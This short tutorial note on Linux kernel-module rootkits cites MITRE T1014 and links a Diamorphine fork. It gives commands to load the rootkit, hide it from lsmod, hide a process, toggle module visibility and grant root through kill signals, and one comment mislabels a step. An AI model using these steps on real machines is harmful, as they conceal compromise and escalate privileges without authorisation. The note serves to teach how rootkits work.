[Rootkits](https://attack.mitre.org/techniques/T1014/) are programs used to hide malware, hook and modify operating system API calls. Usually, on Linux machines, these are created in form of Linux Kernel Module (LKM) which can be inserted in the kernel.

Example:
https://github.com/wazuh/Diamorphine

```bash
# Inset rootkit.ko into kernel
insmod diamorphine.ko
# List kernel modules / you cant see this cuz rootkit is hidden 
lsmod
# Unhide Diamorphine module
kill -63 <any_random_pid>
# Hide Diamorphine module
sleep 1000
kill -31 <pid_of_process> # this will hide in sleep 1000 process and that could be any process
# Diamorphine can grant any use root whoever runs
kill -64 <any_random_pid>
```

